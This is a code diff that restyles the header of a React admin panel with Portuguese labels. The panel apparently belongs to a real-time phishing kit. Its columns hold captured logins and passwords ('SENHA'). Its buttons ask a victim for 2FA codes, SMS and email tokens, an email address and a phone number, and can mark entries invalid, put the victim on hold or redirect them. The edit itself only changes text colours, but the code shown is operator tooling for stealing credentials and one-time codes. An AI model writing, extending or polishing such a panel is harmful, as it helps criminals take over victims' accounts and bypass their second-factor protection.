@@ -394,29 +394,29 @@ function AdminPanel() {
                       <table className="w-full border-collapse">
                       <thead>
                         <tr>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-gray-400 border border-[#2a2a2a]">#</th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-gray-400 border border-[#2a2a2a]">status</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">#</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">status</th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "INV")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-red-400 border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                             title="Clique para avisar que dados estão incorretos"
                           >
                             INV
                           </th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-yellow-400 border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
-                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-green-400 border border-[#2a2a2a]">SENHA</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a]">SENHA</th>
                           <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "AUT")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-cyan-400 cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
                                 title="Clique para pedir código 2FA"
                               >
                                 AUT
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "AUT")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar código 2FA"
                               >
                                 X
@@ -427,14 +427,14 @@ function AdminPanel() {
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "EMAIL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-purple-400 cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
                                 title="Clique para pedir email cadastrado"
                               >
                                 EMAIL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "EMAIL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar email"
                               >
                                 X
@@ -445,14 +445,14 @@ function AdminPanel() {
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TOK-TEL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-orange-400 cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
                                 title="Clique para pedir código do telefone"
                               >
                                 TOK-TEL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar código SMS"
                               >
                                 X
@@ -463,14 +463,14 @@ function AdminPanel() {
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TELEFONE")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-green-400 cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
                                 title="Clique para pedir número de telefone"
                               >
                                 Nº TEL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar telefone"
                               >
                                 X
@@ -481,14 +481,14 @@ function AdminPanel() {
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
-                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-blue-400 cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
                                 title="Clique para pedir token do email"
                               >
                                 TOK-MAIL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")}
-                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar token do email"
                               >
                                 X
@@ -497,21 +497,21 @@ function AdminPanel() {
                           </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "AGUARDE")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-yellow-400 border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
                             title="Clique para colocar em aguarde"
                           >
                             👍
                           </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "REDIRECT")}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-pink-400 border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
                             title="Clique para redirecionar usuário"
                           >
                             Close
                           </th>
                           <th 
                             onClick={() => deleteAttempt(attempt.id)}
-                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-red-400 border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-white border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                             title="Excluir este card"
                           >
                             🗑️
